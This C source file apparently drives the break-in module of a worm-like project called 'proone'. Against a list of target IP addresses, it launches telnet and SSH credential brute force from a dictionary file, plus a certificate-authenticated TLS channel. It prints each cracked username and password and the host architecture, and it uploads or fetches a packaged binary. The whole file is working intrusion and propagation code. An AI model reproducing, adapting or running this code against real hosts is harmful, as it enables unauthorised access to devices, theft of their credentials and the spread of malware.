#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <string.h>
#include <errno.h>
#include <getopt.h>

#include <signal.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <net/if.h>

#include <mbedtls/entropy.h>

#include "util_rt.h"
#include "bne.h"
#include "llist.h"
#include "mbedtls.h"
#include "proone_conf/x509.h"

#define HELP_STR \
"Usage: %s <options> <target> [more targets ...]\n"\
"Options:\n"\
"  --cdict <PATH>  path to credential dictionary(required)\n"\
"  --nybin <PATH>  path to nybin(required)\n"\
"  --vercmp <INT>  vercmp() callback return value. Use negative to get binary\n"\
"                  from target. Use positive value to update binary of target.\n"\
"                  Use zero to disable M2M binary update(default).\n"\
"Target: IPv4 or IPv6 address\n"

struct {
	char *cd_path;
	char *nybin_path;
	struct {
		prne_ip_addr_t *arr;
		size_t cnt;
	} targets;
	int vercmp_ret;
} prog_conf;

struct {
	struct {
		char *addr;
		uint32_t scope_id;
	} arg;
	struct {
		uint8_t *m;
		size_t l;
		prne_cred_dict_t ctx;
	} cred_dict;
	struct {
		uint8_t *m;
		size_t l;
	} nybin;
	struct {
		const uint8_t *m;
		size_t l;
		prne_bin_archive_t ctx;
	} ba;
	struct {
		char path[256];
		char args[1024];
		size_t args_size;
	} upbin;
	struct {
		mbedtls_entropy_context entropy;
		mbedtls_ctr_drbg_context ctr_drbg;
		mbedtls_x509_crt ca;
		mbedtls_x509_crt crt;
		mbedtls_pk_context key;
		mbedtls_ssl_config conf;
	} ssl;
	prne_llist_t wkr_list;
	prne_rcb_param_t rcb_param;
	prne_bne_param_t bne_param;
} prog_g;

static void print_help (FILE *o, const char *prog) {
	fprintf(o, HELP_STR, prog);
}

static void init_g (void) {
	prne_memzero(&prog_g, sizeof(prog_g));

	prne_init_cred_dict(&prog_g.cred_dict.ctx);
	prne_init_bne_param(&prog_g.bne_param);
	prne_init_rcb_param(&prog_g.rcb_param);
	prne_init_bin_archive(&prog_g.ba.ctx);

	mbedtls_x509_crt_init(&prog_g.ssl.ca);
	mbedtls_x509_crt_init(&prog_g.ssl.crt);
	mbedtls_pk_init(&prog_g.ssl.key);
	mbedtls_ssl_config_init(&prog_g.ssl.conf);

	mbedtls_entropy_init(&prog_g.ssl.entropy);
	mbedtls_ctr_drbg_init(&prog_g.ssl.ctr_drbg);
	prne_init_llist(&prog_g.wkr_list);

	prne_assert(mbedtls_ctr_drbg_seed(
		&prog_g.ssl.ctr_drbg,
		mbedtls_entropy_func,
		&prog_g.ssl.entropy,
		NULL,
		0) == 0);
}

static void free_g (void) {
	prne_free(prog_g.arg.addr);
	prog_g.arg.addr = NULL;
	prne_free_llist(&prog_g.wkr_list);
	mbedtls_ctr_drbg_free(&prog_g.ssl.ctr_drbg);
	mbedtls_entropy_free(&prog_g.ssl.entropy);
	mbedtls_x509_crt_free(&prog_g.ssl.ca);
	mbedtls_x509_crt_free(&prog_g.ssl.crt);
	mbedtls_pk_free(&prog_g.ssl.key);
	mbedtls_ssl_config_free(&prog_g.ssl.conf);
	prne_free_cred_dict(&prog_g.cred_dict.ctx);
	prne_free_bne_param(&prog_g.bne_param);
	prne_free_rcb_param(&prog_g.rcb_param);
	prne_free_bin_archive(&prog_g.ba.ctx);
	prne_free(prog_g.cred_dict.m);
	prog_g.cred_dict.m = NULL;
	prog_g.cred_dict.l = 0;
	prne_free(prog_g.nybin.m);
	prog_g.nybin.m = NULL;
	prog_g.nybin.l = 0;
}

static void init_conf (void) {
	prne_memzero(&prog_conf, sizeof(prog_conf));
}

static void free_conf (void) {
	prne_free(prog_conf.cd_path);
	prog_conf.cd_path = NULL;
	prne_free(prog_conf.nybin_path);
	prog_conf.nybin_path = NULL;
	prne_free(prog_conf.targets.arr);
	prog_conf.targets.arr = NULL;
	prog_conf.targets.cnt = 0;
}

static void load_str (char **dst, const char *str) {
	*dst = prne_redup_str(*dst, str);
	if (*dst == NULL) {
		perror("prne_redup_str()");
		abort();
	}
}

static bool load_addr (const char *addr) {
	char *p;

	prog_g.arg.addr = prne_redup_str(prog_g.arg.addr, addr);
	prne_assert(prog_g.arg.addr != NULL);

	p = strrchr(prog_g.arg.addr, '%');
	if (p != NULL) {
		*p = 0;
		p += 1;
		prog_g.arg.scope_id = if_nametoindex(p);

		if (prog_g.arg.scope_id == 0 &&
			1 != sscanf(p, "%"SCNu32, &prog_g.arg.scope_id))
		{
			return false;
		}
	}
	else {
		prog_g.arg.scope_id = 0;
	}

	return true;
}

static int parse_args (const int argc, char *const*args) {
	static const struct option lopts[] = {
		{ "cdict", required_argument, 0, 0 },
		{ "nybin", required_argument, 0, 0 },
		{ "vercmp", required_argument, 0, 0 },
		{ 0, 0, 0, 0 }
	};
	bool arg_proc = false;
	int f_ret, li;

	while (true) {
		f_ret = getopt_long(argc, args, "", lopts, &li);
		if (f_ret == 0) {
			const struct option *lo = lopts + li;

			if (strcmp(lo->name, "cdict") == 0) {
				load_str(&prog_conf.cd_path, optarg);
			}
			else if (strcmp(lo->name, "nybin") == 0) {
				load_str(&prog_conf.nybin_path, optarg);
			}
			else if (strcmp(lo->name, "vercmp") == 0) {
				f_ret = sscanf(optarg, "%d", &prog_conf.vercmp_ret);
				if (f_ret == EOF) {
					perror("sscanf()");
					return 1;
				}
				if (f_ret != 1) {
					fprintf(
						stderr,
						"%s: invalid argument for --vercmp\n",
						optarg);
					return 2;
				}
			}
			else {
				abort();
			}

			arg_proc = true;
		}
		else if (f_ret == '?') {
			return 2;
		}
		else {
			break;
		}
	}

	if (!arg_proc) {
		print_help(stderr, args[0]);
		return 2;
	}
	if (prog_conf.cd_path == NULL) {
		fprintf(stderr, "--cred_dict required.\n");
		return 2;
	}
	if (prog_conf.nybin_path == NULL) {
		fprintf(stderr, "--nybin required.\n");
		return 2;
	}
	prog_conf.targets.cnt = argc - optind;
	if (prog_conf.targets.cnt == 0) {
		fprintf(stderr, "No target.\n");
		return 2;
	}

	prog_conf.targets.arr = prne_calloc(
		sizeof(prne_ip_addr_t),
		prog_conf.targets.cnt);
	for (size_t i = 0; i < prog_conf.targets.cnt; i += 1, optind += 1) {
		prne_ip_addr_t *p = prog_conf.targets.arr + i;

		if (!load_addr(args[optind])) {
			fprintf(stderr, "%s: invalid scope id\n", args[optind]);
			return 2;
		}

		if (inet_pton(AF_INET6, prog_g.arg.addr, p->addr)) {
			p->ver = PRNE_IPV_6;
			p->scope_id = prog_g.arg.scope_id;
		}
		else if (inet_pton(AF_INET, prog_g.arg.addr, p->addr)) {
			p->ver = PRNE_IPV_4;
		}
		else {
			fprintf(stderr, "%s: invalid IP address\n", args[optind]);
			return 2;
		}
	}

	return 0;
}

static bool load_file (const char *path, uint8_t **obuf, size_t *olen) {
	bool ret = false;
	int fd = -1;
	ssize_t f_ret;
	uint8_t *m = NULL;
	struct stat st;

	fd = open(path, O_RDONLY);
	if (fd < 0) {
		perror(path);
		goto END;
	}

	f_ret = fstat(fd, &st);
	if (f_ret != 0) {
		perror(path);
		goto END;
	}

	m = (uint8_t*)prne_malloc(1, st.st_size);
	if (m == NULL && st.st_size > 0) {
		perror("prne_malloc()");
		goto END;
	}
	f_ret = read(fd, m, st.st_size);
	if (f_ret < 0) {
		perror("read()");
		goto END;
	}
	if (f_ret != st.st_size) {
		fprintf(stderr, "%s: file changed whilst loading!\n", path);
		goto END;
	}
	ret = true;

END:
	prne_close(fd);
	if (ret) {
		*obuf = m;
		*olen = st.st_size;
	}
	else {
		prne_free(m);
	}
	return ret;
}

static bool load_htbt_ssl_conf (
	mbedtls_x509_crt *ca,
	mbedtls_x509_crt *crt,
	mbedtls_pk_context *key,
	mbedtls_ssl_config *conf,
	mbedtls_ctr_drbg_context *rnd)
{
	static const char *ALP_LIST[] = { PRNE_HTBT_TLS_ALP, NULL };
	static const uint8_t
		CA_CRT[] = PRNE_X509_CA_CRT,
		CRT[] = PRNE_X509_C_CRT,
		KEY[] = PRNE_X509_C_KEY;

	assert(mbedtls_x509_crt_parse(ca, CA_CRT, sizeof(CA_CRT)) == 0);

	assert(
		mbedtls_ssl_config_defaults(
			conf,
			MBEDTLS_SSL_IS_CLIENT,
			MBEDTLS_SSL_TRANSPORT_STREAM,
			MBEDTLS_SSL_PRESET_DEFAULT) == 0 &&
		mbedtls_x509_crt_parse(crt, CRT, sizeof(CRT)) == 0 &&
		mbedtls_pk_parse_key(key, KEY, sizeof(KEY), NULL, 0) == 0 &&
		mbedtls_ssl_conf_own_cert(conf, crt, key) == 0);
	assert(mbedtls_ssl_conf_alpn_protocols(conf, ALP_LIST) == 0);
	mbedtls_ssl_conf_ca_chain(conf, ca, NULL);
	mbedtls_ssl_conf_verify(conf, prne_mbedtls_x509_crt_verify_cb, NULL);
	mbedtls_ssl_conf_rng(conf, mbedtls_ctr_drbg_random, rnd);
	mbedtls_ssl_conf_authmode(conf, MBEDTLS_SSL_VERIFY_REQUIRED);

	return true;
}

static void report_result (const prne_bne_result_t *r) {
	char ip_str[INET6_ADDRSTRLEN];
	const char *vec_str = prne_bne_vector_tostr(r->vec);

	prne_memzero(ip_str, INET6_ADDRSTRLEN);
	if (vec_str == NULL) {
		vec_str = "(unsuccessful)";
	}

	switch (r->subject->ver) {
	case PRNE_IPV_4:
		inet_ntop(AF_INET, r->subject->addr, ip_str, INET6_ADDRSTRLEN);
		break;
	case PRNE_IPV_6:
		inet_ntop(AF_INET6, r->subject->addr, ip_str, INET6_ADDRSTRLEN);
		break;
	default: abort();
	}

	printf(
		"- result:\n"
		"\tsubject: %s\n"
		"\terr: %d\n"
		"\tvector: %s\n"
		"\tny_instance: %s\n",
		ip_str,
		r->err,
		vec_str,
		r->ny_instance ? "true" : "false");
	if (r->vec >= 0) {
		const char *arch_str;

		if (r->cred.id != NULL) {
			printf(
				"\tcred:\n"
				"\t\tid: %s\n"
				"\t\tpw: %s\n",
				r->cred.id,
				r->cred.pw);
		}
		printf("\tprc: %d\n", r->prc);
		arch_str = prne_arch_tostr(r->bin_host.arch);
		if (arch_str != NULL) {
			printf("\thost arch: %s\n", arch_str);
		}
		arch_str = prne_arch_tostr(r->bin_used.arch);
		if (arch_str != NULL) {
			printf("\tbin arch: %s\n", arch_str);
		}
	}
}

static char *cb_exec_name (void *ctx) {
	return prne_dup_str("proone");
}

static uint64_t cb_uptime (void *ctx) {
	return UINT64_MAX;
}

static int cb_vercmp (void *ctx, const uint8_t *uuid) {
	return prog_conf.vercmp_ret;
}

static int cb_tmpfile (
	void *ctx,
	const int flags,
	const mode_t mode,
	size_t req_size,
	char **opath)
{
	static int ctr = 0;
	char *path = NULL;
	int fd = -1, len;
	bool ret = false;

	len = snprintf(NULL, 0, "bne-tmp.%d", ctr);
	if (len < 0) {
		goto END;
	}
	path = prne_alloc_str(len);
	if (path == NULL) {
		goto END;
	}
	prne_memzero(path, len + 1);
	if (len != snprintf(path, len + 1, "bne-tmp.%d", ctr)) {
		goto END;
	}
	ctr += 1;

	fd = open(path, flags, mode);
	if (fd < 0) {
		goto END;
	}
	if (ftruncate(fd, (off_t)req_size) != 0) {
		goto END;
	}
	ret = true;

END:
	if (ret) {
		if (opath != NULL) {
			*opath = path;
			path = NULL;
		}
	}
	else {
		if (fd >= 0) {
			unlink(path);
		}
		prne_close(fd);
		fd = -1;
	}
	prne_free(path);
	return fd;
}

static bool cb_upbin (void *ctx, const char *path, const prne_htbt_cmd_t *cmd) {
	const size_t path_len = prne_nstrlen(path);

	prne_dbgast(path_len > 0);
	if (path_len + 1 > sizeof(prog_g.upbin.path) ||
		cmd->mem_len > sizeof(prog_g.upbin.args))
	{
		errno = ENOMEM;
		return false;
	}

	memcpy(prog_g.upbin.path, path, path_len + 1);
	memcpy(prog_g.upbin.args, cmd->mem, cmd->mem_len);
	prog_g.upbin.args_size = cmd->mem_len;

	return true;
}

static char *cb_bne_lock_name (void *ctx) {
	return prne_dup_str("bne_lock");
}

static void do_run_upbin (void) {
	for (size_t i = 0; i < prog_g.upbin.args_size; i += 1) {
		if (prog_g.upbin.args[i] == 0) {
			prog_g.upbin.args[i] = ' ';
		}
	}
	prog_g.upbin.args[prog_g.upbin.args_size - 1] = 0;

	printf(
		"upbin received:\n%s %s\n",
		prog_g.upbin.path,
		prog_g.upbin.args);
}


int main (int argc, char **args) {
	static prne_bne_vector_t ARR_VEC[] = {
		PRNE_BNE_V_HTBT,
		PRNE_BNE_V_BRUTE_TELNET,
		PRNE_BNE_V_BRUTE_SSH
	};
	int ret = 0;
	prne_pack_rc_t prc;
	pth_event_t ev_root = NULL;

	signal(SIGPIPE, SIG_IGN);

	init_conf();
	init_g();
	prne_assert(pth_init());

// TRY
	ret = parse_args(argc, args);
	if (ret != 0) {
		goto END;
	}

	if (!load_htbt_ssl_conf(
			&prog_g.ssl.ca,
			&prog_g.ssl.crt,
			&prog_g.ssl.key,
			&prog_g.ssl.conf,
			&prog_g.ssl.ctr_drbg) ||
		!load_file(
			prog_conf.cd_path,
			&prog_g.cred_dict.m,
			&prog_g.cred_dict.l) ||
		!load_file(
			prog_conf.nybin_path,
			&prog_g.nybin.m,
			&prog_g.nybin.l))
	{
		ret = 1;
		goto END;
	}

	if (!prne_dser_cred_dict(
			&prog_g.cred_dict.ctx,
			prog_g.cred_dict.m,
			prog_g.cred_dict.l))
	{
		perror("prne_dser_cred_dict()");
		ret = 1;
		goto END;
	}

	if (!prne_index_nybin(
			prog_g.nybin.m,
			prog_g.nybin.l,
			&prog_g.rcb_param.m_dv,
			&prog_g.rcb_param.dv_len,
			&prog_g.ba.m,
			&prog_g.ba.l))
	{
		perror("prne_index_nybin()");
		ret = 1;
		goto END;
	}

	prc = prne_index_bin_archive(prog_g.ba.m, prog_g.ba.l, &prog_g.ba.ctx);
	if (prc != PRNE_PACK_RC_OK) {
		fprintf(
			stderr,
			"prne_index_bin_archive(): %d\n",
			prc);
		ret = 1;
		goto END;
	}

	prog_g.rcb_param.ba = &prog_g.ba.ctx;

	prog_g.bne_param.htbt_ssl_conf = &prog_g.ssl.conf;
	prog_g.bne_param.cred_dict = &prog_g.cred_dict.ctx;
	prog_g.bne_param.vector.arr = ARR_VEC;
	prog_g.bne_param.vector.cnt = sizeof(ARR_VEC)/sizeof(prne_bne_vector_t);
	prog_g.bne_param.rcb = &prog_g.rcb_param;
	prog_g.bne_param.cb.exec_name = cb_exec_name;
	prog_g.bne_param.cb.uptime = cb_uptime;
	prog_g.bne_param.cb.vercmp = cb_vercmp;
	prog_g.bne_param.cb.tmpfile = cb_tmpfile;
	prog_g.bne_param.cb.upbin = cb_upbin;
	prog_g.bne_param.cb.bne_lock_name = cb_bne_lock_name;

	for (size_t i = 0; i < prog_conf.targets.cnt; i += 1) {
		prne_worker_t *w = prne_malloc(sizeof(prne_worker_t), 1);

		prne_init_worker(w);
		prne_assert(prne_llist_append(
			&prog_g.wkr_list,
			(prne_llist_element_t)w) != NULL);

		prog_g.bne_param.subject = prog_conf.targets.arr[i];
		if (!prne_alloc_bne(w, &prog_g.ssl.ctr_drbg, &prog_g.bne_param)) {
			perror("prne_alloc_bne()");
			abort();
		}

		w->pth = pth_spawn(PTH_ATTR_DEFAULT, w->entry, w->ctx);
		prne_assert(w->pth != NULL);
	}

	while (prog_g.wkr_list.size > 0) {
		// rebuild event
		pth_event_free(ev_root, TRUE);
		ev_root = NULL;
		for (prne_llist_entry_t *e = prog_g.wkr_list.head;
			e != NULL;
			e = e->next)
		{
			prne_worker_t *w = (prne_worker_t*)e->element;
			pth_event_t ev = pth_event(
				PTH_EVENT_TID | PTH_UNTIL_TID_DEAD,
				w->pth);

			prne_assert(ev != NULL);
			if (ev_root == NULL) {
				ev_root = ev;
			}
			else {
				pth_event_concat(ev_root, ev, NULL);
			}
		}

		pth_wait(ev_root);

		// reap
		for (prne_llist_entry_t *e = prog_g.wkr_list.head; e != NULL;) {
			prne_worker_t *w = (prne_worker_t*)e->element;
			pth_attr_t attr = pth_attr_of(w->pth);
			pth_state_t state;

			prne_assert(
				attr != NULL &&
				pth_attr_get(attr, PTH_ATTR_STATE, &state));
			pth_attr_destroy(attr);
			if (state == PTH_STATE_DEAD) {
				void *result;

				prne_assert(pth_join(w->pth, &result));
				w->pth = NULL;
				report_result((const prne_bne_result_t*)result);

				prne_free_worker(w);
				prne_free(w);
				e = prne_llist_erase(&prog_g.wkr_list, e);
			}
			else {
				e = e->next;
			}
		}
	}

END: // CATCH
	pth_event_free(ev_root, TRUE);
	free_g();
	free_conf();
	pth_kill();

	if (prog_g.upbin.path[0] != 0) {
		do_run_upbin();
	}

	return ret;
}
